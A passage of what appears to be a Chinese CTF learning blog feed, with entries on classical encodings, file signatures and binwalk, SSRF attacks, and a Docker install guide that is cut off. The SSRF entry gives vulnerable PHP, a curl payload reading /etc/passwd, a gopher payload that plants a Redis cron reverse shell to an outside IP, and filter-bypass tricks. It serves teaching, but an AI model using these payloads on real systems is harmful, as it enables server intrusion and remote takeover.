href="https://www.toolzl.com/tools/htmlende.html">HTML实体编码互转</a></p><h2 id="6-URL编码"><a href="#6-URL编码" class="headerlink" title="6.URL编码"></a>6.URL编码</h2><p>编码方法很简单，在该字节ascii码的的16进制字符前面加%. 如 空格字符，ascii码是32，对应16进制是’20’，那么urlencode编码结果是:%20。</p><p>编码前面都有%</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">明文：hello,world</span><br><span class="line">%68%65%6c%6c%6f%a3%ac%77%6f%72%6c%64%2e</span><br></pre></td></tr></table></figure><p><a href="http://web.chacuo.net/charseturlencode">在线URL</a></p><h2 id="7-Hex编码"><a href="#7-Hex编码" class="headerlink" title="7.Hex编码"></a>7.Hex编码</h2><p>十六进制（Hexadecimal）</p><p>它是计算机中数据的一种表示方法，<strong>由0-9，A-F组 成，字母不区分大小写</strong>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">明文：hello，world.</span><br><span class="line">密文（带%）：%68%65%6c%6c%6f%ef%bc%8c%77%6f%72%6c%64%2e</span><br><span class="line">密文（不带%）：68656C6C6FEFBC8C776F726C642E</span><br></pre></td></tr></table></figure><p><a href="https://www.107000.com/T-Hex">不带%</a></p><p><a href="http://stool.chinaz.com/hex">带%</a></p><h2 id="8-Jother编码"><a href="#8-Jother编码" class="headerlink" title="8.Jother编码"></a>8.Jother编码</h2><p>只用 **! + ( ) [ ] { } **这八个字符就能完成对任意字符串的编码。可在F12中解密执行</p><img src="/2022/01/17/Crypto%E5%9F%BA%E7%A1%80/image-20220119172909513.png" alt="Jother编码" style="zoom:25%;"><h2 id="9-JSFuck"><a href="#9-JSFuck" class="headerlink" title="9.JSFuck"></a>9.JSFuck</h2><p><strong>与jother很像，只是少了{ }</strong></p><p><a href="http://www.jsfuck.com/">JSFuck </a></p><p>解密在F12的console中</p><h2 id="10-Quoted-printable编码"><a href="#10-Quoted-printable编码" class="headerlink" title="10.Quoted-printable编码"></a>10.Quoted-printable编码</h2><p>任何一个8位的字节值可编码为3个字符：一个等号”=”后跟随两个十六进制数字(0–9或A–F)表示该字节的数值.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">明文：天上掉下了个猪八戒</span><br><span class="line">密文：=E5=A4=A9=E4=B8=8A=E6=8E=89=E4=B8=8B=E4=BA=86=E4=B8=AA=E7=8C=AA=E5=85=AB=E6=88=92</span><br></pre></td></tr></table></figure><p><a href="http://www.mxcz.net/tools/QuotedPrintable.aspx"> Quoted-Printable</a></p><p><a href="https://dencode.com/string/quoted-printable">Quoted-printable Encoder / Decoder Online - DenCode</a></p><h2 id="11-XXencode"><a href="#11-XXencode" class="headerlink" title="11.XXencode"></a>11.XXencode</h2><p>字符范围是：<strong>0-9，A-Z，a-z</strong>，</p><p> 一共64个字符。跟base64打印字符相比，就是UUencode多一个“-” 字符，少一个”/” 字符。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">明文：hello，world.</span><br><span class="line">密文：BO4JgP4yXf5RjQalY9U++</span><br></pre></td></tr></table></figure><p><a href="http://web.chacuo.net/charsetxxencode">XXencode加解密</a></p><h2 id="12-UUencode"><a href="#12-UUencode" class="headerlink" title="12.UUencode"></a>12.UUencode</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">明文：hello,world.</span><br><span class="line">密文：,:&amp;5L;&amp;\L=V]R;&amp;0N</span><br></pre></td></tr></table></figure><p><a href="http://web.chacuo.net/charsetuuencode">在线UUencode</a></p><p><a href="https://www.qqxiuzi.cn/bianma/uuencode.php">Uuencode</a></p><h2 id="13-brainfuck"><a href="#13-brainfuck" class="headerlink" title="13.brainfuck"></a>13.brainfuck</h2><p>BrainFuck 语言只有八种符号，所有的操作都由这八种符号 <strong>(&gt; &lt; + - . , [ ])</strong> 的组合来完成。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">明文：hello,world.</span><br><span class="line">密文：+++++ +++++ [-&gt;++ +++++ +++&lt;] &gt;++++ .---. +++++ ++..+ ++.&lt;+ +++++ ++[-&gt;</span><br><span class="line">----- ---&lt;] &gt;---. &lt;++++ ++++[ -&gt;+++ +++++ &lt;]&gt;++ +++++ ++++. ----- ---.+</span><br><span class="line">++.-- ----. ----- ---.&lt; +++++ ++[-&gt; ----- --&lt;]&gt; ----- .&lt;</span><br></pre></td></tr></table></figure><p><a href="https://www.splitbrain.org/services/ook">Brainfuck</a></p><p><a href="https://www.nayuki.io/page/brainfuck-interpreter-javascript">Brainfuck interpreter</a></p><h2 id="14-与佛论禅"><a href="#14-与佛论禅" class="headerlink" title="14.与佛论禅"></a>14.与佛论禅</h2><p>密文以”佛曰：如是我闻：”开头，密文一般是与关佛经的汉字</p><p><a href="https://www.keyfc.net/bbs/tools/tudoucode.aspx">与佛论禅</a></p><h2 id="15-摩斯密码"><a href="#15-摩斯密码" class="headerlink" title="15.摩斯密码"></a>15.摩斯密码</h2><ol><li>点（.）</li><li>划（-）</li><li>每个字符间短的停顿（通常用空格表示停顿）</li><li>每个词之间中等的停顿（通常用 <code>/</code> 划分）</li><li>以及句子之间长的停顿</li></ol><p>莫尔斯电码对应表：</p><table><thead><tr><th align="left">A <strong>.-</strong></th><th align="left">B <strong>-…</strong></th><th align="left">C <strong>-.-.</strong></th><th align="left">D <strong>-..</strong></th><th align="left">E <strong>.</strong></th><th align="left">F <strong>..-.</strong></th><th align="left">G <strong>–.</strong></th><th align="left">H <strong>….</strong></th><th align="left">I <strong>..</strong></th><th align="left">J <strong>.—</strong></th></tr></thead><tbody><tr><td align="left">K <strong>-.-</strong></td><td align="left">L <strong>.-..</strong></td><td align="left">M <strong>–</strong></td><td align="left">N <strong>-.</strong></td><td align="left">O <strong>—</strong></td><td align="left">P <strong>.–.</strong></td><td align="left">Q <strong>–.-</strong></td><td align="left">R <strong>.-.</strong></td><td align="left">S <strong>…</strong></td><td align="left">T <strong>-</strong></td></tr><tr><td align="left">U <strong>..-</strong></td><td align="left">V <strong>…-</strong></td><td align="left">W <strong>.–</strong></td><td align="left">X <strong>-..-</strong></td><td align="left">Y <strong>-.–</strong></td><td align="left">Z <strong>–..</strong></td><td align="left">0 <strong>—–</strong></td><td align="left">1 <strong>.—-</strong></td><td align="left">2 <strong>..—</strong></td><td align="left">3 <strong>…–</strong></td></tr><tr><td align="left">4 <strong>….-</strong></td><td align="left">5 <strong>…..</strong></td><td align="left">6 <strong>-….</strong></td><td align="left">7 <strong>–…</strong></td><td align="left">8 <strong>—..</strong></td><td align="left">9 <strong>—-.</strong></td><td align="left">. <strong>.-.-.-</strong></td><td align="left">, <strong>–..–</strong></td><td align="left">? <strong>..–..</strong></td><td align="left">- <strong>-….-</strong></td></tr><tr><td align="left">= <strong>-…-</strong></td><td align="left">: <strong>—…</strong></td><td align="left">; <strong>-.-.-.</strong></td><td align="left">( <strong>-.–.</strong></td><td align="left">) <strong>-.–.-</strong></td><td align="left">/ <strong>-..-.</strong></td><td align="left">“ <strong>.-..-.</strong></td><td align="left">$ <strong>…-..-</strong></td><td align="left">‘ <strong>.—-.</strong></td><td align="left">¶ <strong>.-.-..</strong></td></tr><tr><td align="left">_ <strong>..–.-</strong></td><td align="left">@ <strong>.–.-.</strong></td><td align="left">! <strong>—.</strong></td><td align="left">! <strong>-.-.–</strong></td><td align="left">+ <strong>.-.-.</strong></td><td align="left">~ <strong>.-…</strong></td><td align="left"># <strong>…-.-</strong></td><td align="left">&amp; <strong>. …</strong></td><td align="left">⁄ <strong>-..-.</strong></td><td align="left"></td></tr></tbody></table><p><a href="http://www.zhongguosou.com/zonghe/moErSiCodeConverter.aspx">摩斯电码</a></p>]]></content>
      
      
      <categories>
          
          <category> crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Misc基础</title>
      <link href="/2022/01/16/Misc%E5%9F%BA%E7%A1%80/"/>
      <url>/2022/01/16/Misc%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="1-常见的文件头-尾"><a href="#1-常见的文件头-尾" class="headerlink" title="1.常见的文件头/尾"></a>1.常见的文件头/尾</h2><table><thead><tr><th>文件类型</th><th align="left">文件头</th><th>文件尾</th></tr></thead><tbody><tr><td>jpg</td><td align="left">FF D8 FF E1</td><td>FF D9</td></tr><tr><td>png</td><td align="left">89 50 4E 47</td><td>AE 42 60 82</td></tr><tr><td>gif</td><td align="left">47 49 46 38</td><td>00 3B</td></tr><tr><td>bmp</td><td align="left">42 4D C0 01</td><td></td></tr><tr><td>zip</td><td align="left">50 4B 03 04</td><td>50 4B</td></tr><tr><td>rar</td><td align="left">52 61 72 21</td><td>C4 3D 7B 00 40 07 00</td></tr><tr><td>pdf</td><td align="left">25 50 44 46 2D 31 2E</td><td></td></tr><tr><td>pcap</td><td align="left">4D 3C 2B 1A</td><td></td></tr></tbody></table><h2 id="2-binwalk使用"><a href="#2-binwalk使用" class="headerlink" title="2.binwalk使用"></a>2.binwalk使用</h2><h3 id="2-1固件分析扫描"><a href="#2-1固件分析扫描" class="headerlink" title="2.1固件分析扫描"></a>2.1固件分析扫描</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> binwalk 文件名</span></span><br></pre></td></tr></table></figure><h3 id="2-2提取文件系统"><a href="#2-2提取文件系统" class="headerlink" title="2.2提取文件系统"></a>2.2提取文件系统</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 使用默认的预定义配置文件extract.conf</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> binwalk -e firmware.bin</span></span><br><span class="line"><span class="meta"> </span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 使用指定自定义的配置文件my_extract.conf</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> binwalk --extract=./my_extract.conf firmware.bin</span></span><br></pre></td></tr></table></figure><h3 id="2-3过滤选项"><a href="#2-3过滤选项" class="headerlink" title="2.3过滤选项"></a>2.3过滤选项</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> binwalk -y filesystem 文件名</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于SSRF</title>
      <link href="/2022/01/11/%E5%85%B3%E4%BA%8ESSRF/"/>
      <url>/2022/01/11/%E5%85%B3%E4%BA%8ESSRF/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="1-简介"><a href="#1-简介" class="headerlink" title="1.简介"></a>1.简介</h2><p>服务端请求伪造（Server Side Request Forgery, SSRF）指的是攻击者在未能取得服务器所有权限时，利用服务器漏洞以服务器的身份发送一条构造好的请求给服务器所在内网。SSRF攻击通常针对外部网络无法直接访问的内部系统。</p><p>SSRF可以对外网、服务器所在内网、本地进行端口扫描，攻击运行在内网或本地的应用，或者利用File协议读取本地文件。</p><p>内网服务防御相对外网服务来说一般会较弱，甚至部分内网服务为了运维方便并没有对内网的访问设置权限验证，所以存在SSRF时，通常会造成较大的危害。</p><p>比如，一个正常的Web应用本应该从指定URL获取网页文本内容或 加载指定地址的图片，而攻击者利用漏洞伪造服务器端发起请求，从而突破了客户端获取不到数据的限制，如内网资源、服务器本地资源等。 </p><p>举例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"> <span class="keyword">echo</span> file_get_contents(<span class="variable">$url</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这段代码使用file_get_contents函数从用户指定的URL获取图片并展示给用户。此时如果攻击者提交如下Payload，就可以获取到内网主机HTTP服务8000端口的开放情况（<a href="http://example.com/ssrf.php">http://example.com/ssrf.php</a>? url=<a href="http://192.168.252.1:8000/">http://192.168.252.1:8000/</a> )。 图1-1所示的就是一个SSRF攻击的示例<img src="/2022/01/11/%E5%85%B3%E4%BA%8ESSRF/image-20220111155352210.png" alt="1-1示例" style="zoom: 25%;"></p><h2 id="2-利用方式"><a href="#2-利用方式" class="headerlink" title="2.利用方式"></a>2.利用方式</h2><p>SSRF利用存在多种形式以及不同的场景，针对不同场景可以使用不同的利用和绕过方式。</p><p>file协议： 只能读取当前被攻击机的文件，内网机器文件不能读取</p><p>dict协议：泄露安装软件版本信息，查看端口，操作内网redis服务等</p><p>gopher协议：gopher支持发出GET、POST请求。可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议(俗称万能协议)。可用于反弹shell</p><p>http/s协议：探测内网主机存活</p><hr><p>以curl为例, 可以使用dict协议操作Redis、file协议读文件、gopher协议反弹Shell等功能，常见的Payload如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># dict protocol (操作Redis)</span><br><span class="line">curl -vvv &#x27;dict://127.0.0.1:6379/info&#x27;</span><br><span class="line"># file protocol (任意文件读取)</span><br><span class="line">curl -vvv &#x27;file:///etc/passwd&#x27;</span><br><span class="line"># gopher protocol (一键反弹Bash)</span><br><span class="line"># * 注意: 链接使用单引号，避免$变量问题</span><br><span class="line">curl -vvv &#x27;gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/103.21.140.84/6789 0&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a&#x27;</span><br></pre></td></tr></table></figure><h2 id="3-相关危险函数"><a href="#3-相关危险函数" class="headerlink" title="3.相关危险函数"></a>3.相关危险函数</h2><p>SSRF涉及到的危险函数主要是网络访问，支持伪协议的网络读取。以PHP为例，涉及到的函数有 <code>file_get_contents()</code> / <code>fsockopen()</code> / <code>curl_exec()</code> 等。</p><h2 id="4-过滤绕过"><a href="#4-过滤绕过" class="headerlink" title="4.过滤绕过"></a>4.过滤绕过</h2><h3 id="4-1-更改ip地址"><a href="#4-1-更改ip地址" class="headerlink" title="4.1 更改ip地址"></a>4.1 更改ip地址</h3><p>例如192.168.0.1这个IP地址可以被改写成：</p><ul><li>8进制格式：0300.0250.0.1</li><li>16进制格式：0xC0.0xA8.0.1</li><li>10进制整数格式：3232235521</li><li>16进制整数格式：0xC0A80001</li><li>合并后两位：1.1.278 / 1.1.755</li><li>合并后三位：1.278 / 1.755 / 3.14159267</li></ul><h3 id="4-2-使用解析到内网的域名"><a href="#4-2-使用解析到内网的域名" class="headerlink" title="4.2  使用解析到内网的域名"></a>4.2  使用解析到内网的域名</h3><p>如果服务端没有先解析IP再过滤内网地址，我们就可以使用localhost等解析到内网的域名。</p><p><code>xip.io</code> 提供了一个方便的服务，这个网站的子域名会解析到对应的IP，例如192.168.0.1.xip.io，解析到192.168.0.1。</p><h3 id="4-3-利用跳转"><a href="#4-3-利用跳转" class="headerlink" title="4.3 利用跳转"></a>4.3 利用跳转</h3><p>如果后端服务器在接收到参数后，正确的解析了URL的host，并且进行了过滤，我们这个时候可以使用跳转的方式来进行绕过。</p><p>可以使用如 <a href="http://httpbin.org/redirect-to?url=http://192.168.0.1">http://httpbin.org/redirect-to?url=http://192.168.0.1</a> 等服务跳转，但是由于URL中包含了192.168.0.1这种内网IP地址，可能会被正则表达式过滤掉，可以通过短地址的方式来绕过。</p><p>常用的跳转有302跳转和307跳转，区别在于307跳转会转发POST请求中的数据等，但是302跳转不会。</p><h3 id="4-4-通过各种非HTTP协议"><a href="#4-4-通过各种非HTTP协议" class="headerlink" title="4.4 通过各种非HTTP协议"></a>4.4 通过各种非HTTP协议</h3><p>如果服务器端程序对访问URL所采用的协议进行验证的话，可以通过非HTTP协议来进行利用。比如通过gopher，可以在一个url参数中构造POST或者GET请求，从而达到攻击内网应用的目的。</p><p>除了gopher协议，File协议也是SSRF中常用的协议，该协议主要用于访问本地计算机中的文件，我们可以通过类似 <code>file:///path/to/file</code> 这种格式来访问计算机本地文件。使用file协议可以避免服务端程序对于所访问的IP进行的过滤。</p><hr><p>21校赛web1:</p><img src="/2022/01/11/%E5%85%B3%E4%BA%8ESSRF/image-20220113170310978.png" alt="web1" style="zoom:25%;"><img src="/2022/01/11/%E5%85%B3%E4%BA%8ESSRF/image-20220113170433765.png" alt="web1-wp" style="zoom:25%;"><hr><p>参考链接：</p><p><a href="https://websec.readthedocs.io/zh/latest/vuln/ssrf.html#section-6">4.4. SSRF — Web安全学习笔记 1.0 文档 (websec.readthedocs.io)</a></p><p><a href="http://jxz1.j9p.com/pc/gdfgfhgjhgf.pdf">CTF特训营 (网络空间安全技术丛书) (j9p.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ubuntu Docker 安装</title>
      <link href="/2022/01/07/Ubuntu-Docker%E5%AE%89%E8%A3%85/"/>
      <url>/2022/01/07/Ubuntu-Docker%E5%AE%89%E8%A3%85/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="第1步-安装Docker"><a href="#第1步-安装Docker" class="headerlink" title="第1步 - 安装Docker"></a><strong>第1步 - 安装Docker</strong></h2><p>官方Ubuntu存储库中提供的Docker安装包，但是可能不是最新的版本。为了确保我们获得最新版本，我们将从官方Docker存储库安装Docker。为此，我们将添加一个新的资源包，从Docker添加GPG密钥以确保下载有效，然后安装该包。</p><p>首先，更新现有的包列表：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br></pre></td></tr></table></figure><p>接下来，使用<code>apt</code>安装一些允许通过HTTPS才能使用的软件包：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install apt-transport-https ca-certificates curl software-properties-common</span><br></pre></td></tr></table></figure><p>然后将官方Docker存储库的GPG密钥添加到您的系统：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -</span><br></pre></td></tr></table></figure><p>将Docker存储库添加到APT源：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository &quot;deb [arch=amd64] https://download.docker.com/linux/ubuntu bionic stable&quot;</span><br></pre></td></tr></table></figure><p>接下来，使用新添加的repo源中的Docker包更新包数据库：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br></pre></td></tr></table></figure><p>确保您要从Docker repo安装而不是默认的Ubuntu repo：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-cache policy docker-ce</span><br></pre></td></tr></table></figure><p>虽然Docker的版本号可能不同，但您还是会看到这样的输出：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">docker-ce:</span><br><span class="line">  Installed: (none)</span><br><span class="line">  Candidate: 18.03.1~ce~3-0~ubuntu</span><br><span class="line">  Version table:</span><br><span class="line">     18.03.1~ce~3-0~ubuntu 500</span><br><span class="line">        500 https://download.docker.com/linux/ubuntu bionic/stable amd64 Packages</span><br></pre></td></tr></table></figure><p>现在<code>docker-ce</code>还没有安装，用上面这个命令我们能看到安装源来自的Docker官方存储库。</p><p>最后，安装Docker：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install docker-ce</span><br></pre></td></tr></table></figure><p>现在应该安装好Docker了，检查它是否正在运行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl status docker</span><br></pre></td></tr></table></figure><p>输出应类似于以下内容，表明该服务处于工作状态：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">● docker.service - Docker Application Container Engine</span><br><span class="line">   Loaded: loaded (/lib/systemd/system/docker.service; enabled; vendor preset: enabled)</span><br><span class="line">   Active: active (running) since Thu 2018-07-05 15:08:39 UTC; 2min 55s ago</span><br><span class="line">     Docs: https://docs.docker.com</span><br><span class="line"> Main PID: 10096 (dockerd)</span><br><span class="line">    Tasks: 16</span><br><span class="line">   CGroup: /system.slice/docker.service</span><br><span class="line">           ├─10096 /usr/bin/dockerd -H fd://</span><br><span class="line">           └─10113 docker-containerd --config /var/run/docker/containerd/containerd.toml</span><br></pre></td></tr></table></figure><p>Docker不仅可以为您提供Docker服务，还可以为您提供docker<a href="https://cloud.tencent.com/product/cli?from=10680">命令行工具</a>或Docker客户端。我们将在本教程后面探讨如何使用docker命令。</p><h2 id="第2步-在不输入Sudo情况下执行Docker（可选）"><a href="#第2步-在不输入Sudo情况下执行Docker（可选）" class="headerlink" title="第2步 - 在不输入Sudo情况下执行Docker（可选）"></a><strong>第2步 - 在不输入Sudo情况下执行Docker（可选）</strong></h2><p>默认情况下，该<code>docker</code>命令只能由<strong>root</strong>用户或<strong>docker</strong>组中的用户运行，该用户在Docker的安装过程中自动创建。如果您尝试运行该<code>docker</code>命令而不使用<code>sudo</code>或不在<strong>docker</strong>组中中用户运行，您将看到如下输出：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker: Cannot connect to the Docker daemon. Is the docker daemon running on this host?.</span><br><span class="line">See &#x27;docker run --help&#x27;.</span><br></pre></td></tr></table></figure><p>要想在在运行<code>docker</code>命令时不输入<code>sudo</code>，请将用户名添加到<code>docker</code>组中：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo usermod -aG docker USER</span><br></pre></td></tr></table></figure><p>要应用新的组成员身份，请注销服务器并重新登录，或输入以下内容：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su - USER</span><br></pre></td></tr></table></figure><p>系统将提示您输入用户密码以继续。</p><p>通过输入以下内容确认您的用户现已添加到<strong>docker</strong>组：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id -nG</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sammy sudo docker</span><br></pre></td></tr></table></figure><p>如果您需要将用户添加到您未登录的<code>docker</code>组中，请使用以下方式明确声明该用户名：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo usermod -aG docker username</span><br></pre></td></tr></table></figure><p> 本文的其余部分假定您以<strong>docker</strong>组中的用户身份运行该<code>docker</code>命令。如果您不是这样做，请在前面添加<code>sudo</code>命令。</p><h2 id="第3步-使用Docker命令"><a href="#第3步-使用Docker命令" class="headerlink" title="第3步 - 使用Docker命令"></a><strong>第3步 - 使用Docker命令</strong></h2><p>命令使用包括传递一系列<code>docker</code>选项和命令，后跟参数。语法采用以下形式：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker [option] [command] [arguments]</span><br></pre></td></tr></table></figure><p>要查看所有可用的子命令，请输入：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker </span><br></pre></td></tr></table></figure><p>可用子命令的完整列表包括：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">attach      Attach local standard input, output, and error streams to a running container</span><br><span class="line">build       Build an image from a Dockerfile</span><br><span class="line">commit      Create a new image from a container&#x27;s changes</span><br><span class="line">cp          Copy files/folders between a container and the local filesystem</span><br><span class="line">create      Create a new container</span><br><span class="line">diff        Inspect changes to files or directories on a container&#x27;s filesystem</span><br><span class="line">events      Get real time events from the server</span><br><span class="line">exec        Run a command in a running container</span><br><span class="line">export      Export a container&#x27;s filesystem as a tar archive</span><br><span class="line">history     Show the history of an image</span><br><span class="line">images      List images</span><br><span class="line">import      Import the contents from a tarball to create a filesystem image</span><br><span class="line">info        Display system-wide information</span><br><span class="line">inspect     Return low-level information on Docker objects</span><br><span class="line">kill        Kill one or more running containers</span><br><span class="line">load        Load an image from a tar archive or STDIN</span><br><span class="line">login       Log in to a Docker registry</span><br><span class="line">logout      Log out from a Docker registry</span><br><span class="line">logs        Fetch the logs of a container</span><br><span class="line">pause       Pause all processes within one or more containers</span><br><span class="line">port        List port mappings or a specific mapping for the container</span><br><span class="line">ps          List containers</span><br><span class="line">pull        Pull an image or a repository from a registry</span><br><span class="line">push        Push an image or a repository to a registry</span><br><span class="line">rename      Rename a container</span><br><span class="line">restart     Restart one or more containers</span><br><span class="line">rm          Remove one or more containers</span><br><span class="line">rmi         Remove one or more images</span><br><span class="line">run         Run a command in a new container</span><br><span class="line">save        Save one or more images to a tar archive (streamed to STDOUT by default)</span><br><span class="line">search      Search the Docker Hub for images</span><br><span class="line">start       Start one or more stopped containers</span><br><span class="line">stats       Display a live stream of container(s) resource usage statistics</span><br><span class="line">stop        Stop one or more running containers</span><br><span class="line">tag         Create a tag TARGET_IMAGE that refers to SOURCE_IMAGE</span><br><span class="line">top         Display the running processes of a container</span><br><span class="line">unpause     Unpause all processes within one or more containers</span><br><span class="line">update      Update configuration of one or more containers</span><br><span class="line">version     Show the Docker version information</span><br><span class="line">wait        Block until one or more containers stop, then print their exit codes</span><br></pre></td></tr></table></figure><p> 要查看特定命令，请输入：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker docker-subcommand --help</span><br></pre></td></tr></table></figure><p>要查看有关Docker的系统信息，请使用：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker info</span><br></pre></td></tr></table></figure><p> 让我们探讨其中的一些命令。我们将从处理镜像开始。</p><h2 id="第4步-使用Docker镜像"><a 